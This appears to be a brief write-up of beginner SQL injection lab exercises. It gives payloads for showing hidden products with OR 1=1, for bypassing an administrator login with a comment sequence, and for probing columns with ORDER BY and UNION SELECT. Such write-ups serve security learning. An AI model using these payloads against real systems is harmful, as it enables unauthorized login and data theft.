# 🐣 Basic SQL Injection Labs:

Here are the write-ups for the introductory labs involving basic SQL Injection concepts.

## Lab 1: Retrieving Hidden Data🚀
**Goal:** Display unreleased products.
* **Payload:** `category=Gifts' OR 1=1--`
* **Explanation:** The query becomes `SELECT * FROM products WHERE category = 'Gifts' OR 1=1`.🔓

## Lab 2: Login Bypass🚀
**Goal:** Log in as Administrator without a password.
* **Payload:** Username: `administrator'--`
* **Explanation:** The comment symbol (`--`) removes the password check part of the SQL query.🔓

## Lab 3 & 4: UNION Attack Fundamentals🚀
**Goal:** Determine column count and data types.
* **Step 1 (Count Columns):** `' ORDER BY 1--`, `' ORDER BY 2--`... until error.
* **Step 2 (Find Text Column):** `' UNION SELECT 'a', NULL--`, `' UNION SELECT NULL, 'a'--`.
* **Result:** Successfully identified structure to prepare for data extraction.🔓
